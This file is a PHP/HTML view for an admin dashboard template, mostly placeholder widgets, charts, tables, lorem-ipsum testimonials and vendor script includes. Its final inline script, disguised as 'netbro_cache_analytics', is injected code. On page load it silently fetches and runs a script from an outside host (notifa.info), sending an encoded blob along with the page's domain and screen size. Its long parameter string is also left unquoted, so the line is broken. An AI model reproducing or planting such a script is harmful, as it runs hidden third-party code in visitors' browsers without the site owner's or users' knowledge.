
        <div class="content-wrap">
            <div class="main">
                <div class="container-fluid">
                    <div class="row">
                        <div class="col-lg-8 p-r-0 title-margin-right">
                            <div class="page-header">
                                <div class="page-title">
                                    <h1><?= $page; ?>, <span><?= STORE_NAME ?></span></h1>
                                </div>
                            </div>
                        </div>
                        <!-- /# column -->
                        <div class="col-lg-4 p-l-0 title-margin-left">
                            <div class="page-header">
                                <div class="page-title">
                                    <ol class="breadcrumb">
                                        <li class="breadcrumb-item"><a href="#">Dashboard</a></li>
                                        <li class="breadcrumb-item active">Home</li>
                                    </ol>
                                </div>
                            </div>
                        </div>
                        <!-- /# column -->
                    </div>
                    <!-- /# row -->
                    <section id="main-content">
                        <div class="row">
                            <div class="col-lg-3">
                                <div class="card">
                                    <div class="stat-widget-two">
                                        <div class="stat-content">
                                            <div class="stat-text">Today Expenses </div>
                                            <div class="stat-digit"> <i class="fa fa-usd"></i>8500</div>
                                        </div>
                                        <div class="progress">
                                            <div class="progress-bar progress-bar-success w-85" role="progressbar" aria-valuenow="85" aria-valuemin="0" aria-valuemax="100"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-3">
                                <div class="card">
                                    <div class="stat-widget-two">
                                        <div class="stat-content">
                                            <div class="stat-text">Income Detail</div>
                                            <div class="stat-digit"> <i class="fa fa-usd"></i>7800</div>
                                        </div>
                                        <div class="progress">
                                            <div class="progress-bar progress-bar-primary w-75" role="progressbar" aria-valuenow="78" aria-valuemin="0" aria-valuemax="100"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-3">
                                <div class="card">
                                    <div class="stat-widget-two">
                                        <div class="stat-content">
                                            <div class="stat-text">Task Completed</div>
                                            <div class="stat-digit"> <i class="fa fa-usd"></i> 500</div>
                                        </div>
                                        <div class="progress">
                                            <div class="progress-bar progress-bar-warning w-50" role="progressbar" aria-valuenow="50" aria-valuemin="0" aria-valuemax="100"></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-3">
                                <div class="card">
                                    <div class="stat-widget-two">
                                        <div class="stat-content">
                                            <div class="stat-text">Task Completed</div>
                                            <div class="stat-digit"> <i class="fa fa-usd"></i>650</div>
                                        </div>
                                        <div class="progress">
                                            <div class="progress-bar progress-bar-danger w-65" role="progressbar" aria-valuenow="65" aria-valuemin="0" aria-valuemax="100"></div>
                                        </div>
                                    </div>
                                </div>
                                <!-- /# card -->
                            </div>
                            <!-- /# column -->
                        </div>
                        <!-- /# row -->


                        <div class="row">
                            <!-- column -->
                            <div class="col-lg-8">
                                <div class="card">
                                    <div class="card-body">
                                        <h4 class="card-title">Sales Overview</h4>
                                        <div id="morris-bar-chart"></div>
                                    </div>
                                </div>
                            </div>
                            <!-- column -->
                            <div class="col-md-4">
                                <div class="card text-center">
                                    <div class="m-t-10">
                                        <p>Customer Feedback</p>
                                        <h5>385749</h5>
                                    </div>
                                    <div class="widget-card-circle pr m-t-20 m-b-20" id="info-circle-card">
                                        <i class="ti-control-shuffle pa"></i>
                                    </div>
                                    <ul class="widget-line-list m-b-15">
                                        <li class="border-right">92% <br><span class="color-success"><i class="ti-hand-point-up"></i> Positive</span></li>
                                        <li>8% <br><span class="color-danger"><i class="ti-hand-point-down"></i>Negative</span></li>
                                    </ul>
                                </div>
                            </div>

                        </div>

                        <div class="row">
                            <div class="col-lg-4">
                                <div class="card">
                                    <div class="card-title">
                                        <h4>Project</h4>
                                    </div>
                                    <div class="card-body">
                                        <div class="current-progress">
                                            <div class="progress-content">
                                                <div class="row">
                                                    <div class="col-lg-4">
                                                        <div class="progress-text">Website</div>
                                                    </div>
                                                    <div class="col-lg-8">
                                                        <div class="current-progressbar">
                                                            <div class="progress">
                                                                <div class="progress-bar progress-bar-primary w-40" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100">
                                                                    40%
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="progress-content">
                                                <div class="row">
                                                    <div class="col-lg-4">
                                                        <div class="progress-text">Android</div>
                                                    </div>
                                                    <div class="col-lg-8">
                                                        <div class="current-progressbar">
                                                            <div class="progress">
                                                                <div class="progress-bar progress-bar-primary w-60" role="progressbar" aria-valuenow="60" aria-valuemin="0" aria-valuemax="100">
                                                                    60%
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="progress-content">
                                                <div class="row">
                                                    <div class="col-lg-4">
                                                        <div class="progress-text">Ios</div>
                                                    </div>
                                                    <div class="col-lg-8">
                                                        <div class="current-progressbar">
                                                            <div class="progress">
                                                                <div class="progress-bar progress-bar-primary w-70" role="progressbar" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100">
                                                                    70%
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="progress-content">
                                                <div class="row">
                                                    <div class="col-lg-4">
                                                        <div class="progress-text">Mobile</div>
                                                    </div>
                                                    <div class="col-lg-8">
                                                        <div class="current-progressbar">
                                                            <div class="progress">
                                                                <div class="progress-bar progress-bar-primary w-90" role="progressbar" aria-valuenow="90" aria-valuemin="0" aria-valuemax="100">
                                                                    90%
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- /# column -->
                            <div class="col-lg-4">
                                <div class="card bg-primary">
                                    <div class="weather-widget">
                                        <div id="weather-one" class="weather-one p-22"></div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-4">
                                <div class="card">
                                    <div class="testimonial-widget-one p-17">
                                        <div class="testimonial-widget-one owl-carousel owl-theme">
                                            <div class="item">
                                                <div class="testimonial-content">
                                                    <div class="testimonial-text">
                                                        <i class="fa fa-quote-left"></i> Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud
                                                        exercitation. consectetur adipisicing elit.
                                                        <i class="fa fa-quote-right"></i>
                                                    </div>
                                                    <img class="testimonial-author-img" src="assets/images/avatar/1.jpg" alt="" />
                                                    <div class="testimonial-author">TYRION LANNISTER</div>
                                                    <div class="testimonial-author-position">Founder-Ceo. Dell Corp</div>
                                                </div>
                                            </div>
                                            <div class="item">
                                                <div class="testimonial-content">
                                                    <div class="testimonial-text">
                                                        <i class="fa fa-quote-left"></i> Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud
                                                        exercitation. consectetur adipisicing elit.
                                                        <i class="fa fa-quote-right"></i>
                                                    </div>
                                                    <img class="testimonial-author-img" src="assets/images/avatar/1.jpg" alt="" />
                                                    <div class="testimonial-author">TYRION LANNISTER</div>
                                                    <div class="testimonial-author-position">Founder-Ceo. Dell Corp</div>
                                                </div>
                                            </div>
                                            <div class="item">
                                                <div class="testimonial-content">
                                                    <div class="testimonial-text">
                                                        <i class="fa fa-quote-left"></i> Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud
                                                        exercitation. consectetur adipisicing elit.
                                                        <i class="fa fa-quote-right"></i>
                                                    </div>
                                                    <img class="testimonial-author-img" src="assets/images/avatar/1.jpg" alt="" />
                                                    <div class="testimonial-author">TYRION LANNISTER</div>
                                                    <div class="testimonial-author-position">Founder-Ceo. Dell Corp</div>
                                                </div>
                                            </div>
                                            <div class="item">
                                                <div class="testimonial-content">
                                                    <div class="testimonial-text">
                                                        <i class="fa fa-quote-left"></i> Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud
                                                        exercitation. consectetur adipisicing elit.
                                                        <i class="fa fa-quote-right"></i>
                                                    </div>
                                                    <img class="testimonial-author-img" src="assets/images/avatar/1.jpg" alt="" />
                                                    <div class="testimonial-author">TYRION LANNISTER</div>
                                                    <div class="testimonial-author-position">Founder-Ceo. Dell Corp</div>
                                                </div>
                                            </div>
                                            <div class="item">
                                                <div class="testimonial-content">
                                                    <div class="testimonial-text">
                                                        <i class="fa fa-quote-left"></i> Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud
                                                        exercitation. consectetur adipisicing elit.
                                                        <i class="fa fa-quote-right"></i>
                                                    </div>
                                                    <img class="testimonial-author-img" src="assets/images/avatar/1.jpg" alt="" />
                                                    <div class="testimonial-author">TYRION LANNISTER</div>
                                                    <div class="testimonial-author-position">Founder-Ceo. Dell Corp</div>
                                                </div>
                                            </div>
                                            <div class="item">
                                                <div class="testimonial-content">
                                                    <div class="testimonial-text">
                                                        <i class="fa fa-quote-left"></i> Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud
                                                        exercitation. consectetur adipisicing elit.
                                                        <i class="fa fa-quote-right"></i>
                                                    </div>
                                                    <img class="testimonial-author-img" src="assets/images/avatar/1.jpg" alt="" />
                                                    <div class="testimonial-author">TYRION LANNISTER</div>
                                                    <div class="testimonial-author-position">Founder-Ceo. Dell Corp</div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>


                        <div class="row">
                            <div class="col-lg-6">
                                <div class="card nestable-cart">
                                    <div class="card-title">
                                        <h4>USA</h4>
                                        <div class="card-title-right-icon">
                                            <ul>

                                            </ul>
                                        </div>
                                    </div>
                                    <div class="Vector-map-js">
                                        <div id="vmap13" class="vmap"></div>
                                    </div>
                                </div>
                                <!-- /# card -->
                            </div>
                            <!-- /# column -->
                            <div class="col-lg-6">
                                <div class="card">
                                    <div class="card-title">
                                        <h4>New Orders </h4>
                                    </div>
                                    <div class="card-body">
                                        <div class="table-responsive">
                                            <table class="table">
                                                <thead>
                                                    <tr>
                                                        <th>#</th>
                                                        <th>Name</th>
                                                        <th>Product</th>
                                                        <th>quantity</th>
                                                        <th>Status</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                                    <tr>
                                                        <td>
                                                            <div class="round-img">
                                                                <a href="#"><img class="w-35" src="assets/images/avatar/1.jpg" alt=""></a>
                                                            </div>
                                                        </td>
                                                        <td>Lew Shawon</td>
                                                        <td><span>Dell-985</span></td>
                                                        <td><span>456 pcs</span></td>
                                                        <td><span class="badge badge-success">Done</span></td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <div class="round-img">
                                                                <a href="#"><img class="w-35" src="assets/images/avatar/1.jpg" alt=""></a>
                                                            </div>
                                                        </td>
                                                        <td>Lew Shawon</td>
                                                        <td><span>Asus-565</span></td>
                                                        <td><span>456 pcs</span></td>
                                                        <td><span class="badge badge-warning">Pending</span></td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <div class="round-img">
                                                                <a href="#"><img class="w-35" src="assets/images/avatar/1.jpg" alt=""></a>
                                                            </div>
                                                        </td>
                                                        <td>lew Shawon</td>
                                                        <td><span>Dell-985</span></td>
                                                        <td><span>456 pcs</span></td>
                                                        <td><span class="badge badge-success">Done</span></td>
                                                    </tr>

                                                    <tr>
                                                        <td>
                                                            <div class="round-img">
                                                                <a href="#"><img class="w-35" src="assets/images/avatar/1.jpg" alt=""></a>
                                                            </div>
                                                        </td>
                                                        <td>Lew Shawon</td>
                                                        <td><span>Asus-565</span></td>
                                                        <td><span>456 pcs</span></td>
                                                        <td><span class="badge badge-warning">Pending</span></td>
                                                    </tr>
                                                    <tr>
                                                        <td>
                                                            <div class="round-img">
                                                                <a href="#"><img class="w-35" src="assets/images/avatar/1.jpg" alt=""></a>
                                                            </div>
                                                        </td>
                                                        <td>lew Shawon</td>
                                                        <td><span>Dell-985</span></td>
                                                        <td><span>456 pcs</span></td>
                                                        <td><span class="badge badge-success">Done</span></td>
                                                    </tr>

                                                    <tr>
                                                        <td>
                                                            <div class="round-img">
                                                                <a href="#"><img class="w-35" src="assets/images/avatar/1.jpg" alt=""></a>
                                                            </div>
                                                        </td>
                                                        <td>Lew Shawon</td>
                                                        <td><span>Asus-565</span></td>
                                                        <td><span>456 pcs</span></td>
                                                        <td><span class="badge badge-warning">Pending</span></td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>




                        <div class="row">
                            <div class="col-lg-4">
                                <div class="card">
                                    <div class="card-title">
                                        <h4>Task</h4>
                                    </div>
                                    <div class="todo-list">
                                        <div class="tdl-holder">
                                            <div class="tdl-content">
                                                <ul>
                                                    <li>
                                                        <label>
                                                        <input type="checkbox"><i></i><span>Post three to six times on Twitter.</span>
                                                        <a href='#' class="ti-close"></a>
                                                    </label>
                                                    </li>
                                                    <li>
                                                        <label>
                                                        <input type="checkbox" checked><i></i><span>Post one to two times on Facebook.</span>
                                                        <a href='#' class="ti-close"></a>
                                                    </label>
                                                    </li>
                                                    <li>
                                                        <label>
                                                        <input type="checkbox" checked><i></i><span>Follow back those who follow you</span>
                                                        <a href='#' class="ti-close"></a>
                                                    </label>
                                                    </li>
                                                    <li>
                                                        <label>
                                                        <input type="checkbox" checked><i></i><span>Connect with one new person</span>
                                                        <a href='#' class="ti-close"></a>
                                                    </label>
                                                    </li>
                                                </ul>
                                            </div>
                                            <input type="text" class="tdl-new form-control" placeholder="Write new item and hit 'Enter'...">
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="col-lg-4">
                                <div class="card alert">
                                    <div class="card-title">
                                        <h4>Web Server</h4>
                                    </div>
                                    <div class="cpu-load-chart">
                                        <div id="cpu-load" class="cpu-load"></div>
                                    </div>
                                </div>
                                <!-- /# card -->
                            </div>
                            <!-- /# column -->
                            <div class="col-lg-4">
                                <div class="card">
                                    <div class="card-title">
                                        <h4>Ticket </h4>

                                    </div>
                                    <div class="recent-comment">
                                        <div class="media">
                                            <div class="media-left">
                                                <a href="#"><img class="media-object" src="assets/images/avatar/1.jpg" alt="..."></a>
                                            </div>
                                            <div class="media-body">
                                                <h4 class="media-heading">john doe</h4>
                                                <p>Cras sit amet nibh libero, in gravida nulla. </p>
                                                <div class="comment-action">
                                                    <div class="badge badge-success">Done</div>
                                                    <span class="m-l-10">
													<a href="#"><i class="ti-check color-success"></i></a>
													<a href="#"><i class="ti-close color-danger"></i></a>
													<a href="#"><i class="fa fa-reply color-primary"></i></a>
												</span>
                                                </div>
                                                <p class="comment-date">October 21, 2017</p>
                                            </div>
                                        </div>
                                        <div class="media">
                                            <div class="media-left">
                                                <a href="#"><img class="media-object" src="assets/images/avatar/2.jpg" alt="..."></a>
                                            </div>
                                            <div class="media-body">
                                                <h4 class="media-heading">Mr. John</h4>
                                                <p>Cras sit amet nibh libero, in gravida nulla. </p>
                                                <div class="comment-action">
                                                    <div class="badge badge-warning">Pending</div>
                                                    <span class="m-l-10">
													<a href="#"><i class="ti-check color-success"></i></a>
													<a href="#"><i class="ti-close color-danger"></i></a>
													<a href="#"><i class="fa fa-reply color-primary"></i></a>
												</span>
                                                </div>
                                                <p class="comment-date">October 21, 2017</p>
                                            </div>
                                        </div>
                                        <div class="media no-border">
                                            <div class="media-left">
                                                <a href="#"><img class="media-object" src="assets/images/avatar/3.jpg" alt="..."></a>
                                            </div>
                                            <div class="media-body">
                                                <h4 class="media-heading">Mr. John</h4>
                                                <p>Cras sit amet nibh libero, in gravida nulla. </p>
                                                <div class="comment-action">
                                                    <div class="badge badge-success">Done</div>
                                                    <span class="m-l-10">
													<a href="#"><i class="ti-check color-success"></i></a>
													<a href="#"><i class="ti-close color-danger"></i></a>
													<a href="#"><i class="fa fa-reply color-primary"></i></a>
												</span>
                                                </div>
                                                <div class="comment-date">October 21, 2017</div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <!-- /# card -->
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-lg-12">
                                <div class="footer">
                                    <p>2018 © Admin Board. - <a href="#">example.com</a></p>
                                </div>
                            </div>
                        </div>
                    </section>
                </div>
            </div>
        </div>
        <div id="search">
            <button type="button" class="close">×</button>
            <form>
                <input type="search" value="" placeholder="type keyword(s) here" />
                <button type="submit" class="btn btn-primary">Search</button>
            </form>
        </div>
        <!-- jquery vendor -->
        <script src="<?= base_url("assets/js/lib/jquery.min.js"); ?>"></script>
        <script src="<?= base_url("assets/js/lib/jquery.nanoscroller.min.js"); ?>"></script>
        <!-- nano scroller -->
        <script src="<?= base_url("assets/js/lib/menubar/sidebar.js"); ?>"></script>
        <script src="<?= base_url("assets/js/lib/preloader/pace.min.js"); ?>"></script>
        <!-- sidebar -->
        <script src="<?= base_url("assets/js/lib/bootstrap.min.js"); ?>"></script>

        <!-- bootstrap -->

        <script src="<?= base_url("assets/js/lib/circle-progress/circle-progress.min.js"); ?>"></script>
        <script src="<?= base_url("assets/js/lib/circle-progress/circle-progress-init.js"); ?>"></script>

        <script src="<?= base_url("assets/js/lib/morris-chart/raphael-min.js"); ?>"></script>
        <script src="<?= base_url("assets/js/lib/morris-chart/morris.js"); ?>"></script>
        <script src="<?= base_url("assets/js/lib/morris-chart/morris-init.js"); ?>"></script>

        <!--  flot-chart js -->
        <script src="<?= base_url("assets/js/lib/flot-chart/jquery.flot.js"); ?>"></script>
        <script src="<?= base_url("assets/js/lib/flot-chart/jquery.flot.resize.js"); ?>"></script>
        <script src="<?= base_url("assets/js/lib/flot-chart/flot-chart-init.js"); ?>"></script>
        <!-- // flot-chart js -->


        <script src="<?= base_url("assets/js/lib/vector-map/jquery.vmap.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/jquery.vmap.min.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/jquery.vmap.sampledata.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/country/jquery.vmap.world.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/country/jquery.vmap.algeria.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/country/jquery.vmap.argentina.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/country/jquery.vmap.brazil.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/country/jquery.vmap.france.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/country/jquery.vmap.germany.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/country/jquery.vmap.greece.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/country/jquery.vmap.iran.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/country/jquery.vmap.iraq.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/country/jquery.vmap.russia.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/country/jquery.vmap.tunisia.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/country/jquery.vmap.europe.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/country/jquery.vmap.usa.js"); ?>"></script>
        <!-- scripit init-->
        <script src="<?= base_url("assets/js/lib/vector-map/vector.init.js"); ?>"></script>

        <script src="<?= base_url("assets/js/lib/weather/jquery.simpleWeather.min.js"); ?>"></script>
        <script src="<?= base_url("assets/js/lib/weather/weather-init.js"); ?>"></script>
        <script src="<?= base_url("assets/js/lib/owl-carousel/owl.carousel.min.js"); ?>"></script>
        <script src="<?= base_url("assets/js/lib/owl-carousel/owl.carousel-init.js"); ?>"></script>
        <script src="<?= base_url("assets/js/scripts.js"); ?>"></script>
        <!-- scripit init-->

        <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + 4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXCyXFpBufKTZ3mBhiEz0e45nCCIvyze%2fWsCgobinzHmjSBTt85GEtDJ83w1anhFNz2fyU%2f7DxG%2bmnQTBfgTPtlrZtLTOMFa6dCBoPRQ4KiRgcfvUWmD%2bmIdhBKIWaQsc4GL0z1iEJSt7QGegkNPzh8wc5ds746TvVRZNtm9msRS8qs3Jys6V547GGweW2d1vGbs10FP4rSx9bXDGgFrG0pVMNkWetds%2fa6nAVYm4aVIJ8C6LE%2fjQ1Gnzs4Xid27mwmBXzKgOUOvU2iUzstB2iMFDARf%2bGtbcgoUXQR8oHYSaYfXybiuuR9gbWs25mJdbhxxZ17aDvwjU6cTA48cJ2mTZ4boZWe0MCEZQx7uZxtTNRlf0i0s9QS7wnAUEDhTFj4z7R7Rzc%2fr51wHPmJgNcBfbAOkolw6dgzy11nZkHQdTa1xFah1piHG%2bU7DJAC2Ws + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>


